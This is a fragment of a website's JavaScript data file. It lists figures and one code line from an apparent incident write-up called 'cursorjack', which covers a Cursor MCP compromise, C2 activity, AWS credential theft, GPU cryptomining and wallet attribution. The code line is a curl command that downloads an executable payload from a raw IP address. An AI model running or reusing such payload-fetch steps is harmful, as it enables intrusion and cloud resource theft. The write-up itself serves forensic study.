...
window.WRITEUPS = [
    ...
    },
    {
        ...
        content: [
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image7.png', caption: 'Figure 2 — Chromium timestamp conversion' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image2.png', caption: 'Figure 3 — Cursor MCP configuration' },
            { type: 'code', text: 'curl -s http://3.72.63.40:80/payload/s.exe -o C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\s.exe' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image12.png', caption: 'Figure 4 — Sysmon payload download event' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image13.png', caption: 'Figure 5 — First observed C2 command' },
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image11.png', caption: 'Figure 6 — AWS credential staging' },
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image5.png', caption: 'Figure 7 — CloudTrail identity attribution' },
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image6.png', caption: 'Figure 8 — Multi-region RunInstances activity' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image8.png', caption: 'Figure 9 — p3.2xlarge instance request' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image9.png', caption: 'Figure 10 — prod-web-server resource tag' },
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image4.png', caption: 'Figure 11 — Recovered XMRig mining script' },
            ...
            { type: 'figure', src: 'assets/writeups/cursorjack/image3.png', caption: 'Figure 12 — Public wallet attribution research' },
            { type: 'figure', src: 'assets/writeups/cursorjack/image10.png', caption: 'Figure 13 — Solscan Drift Vault transfer' },
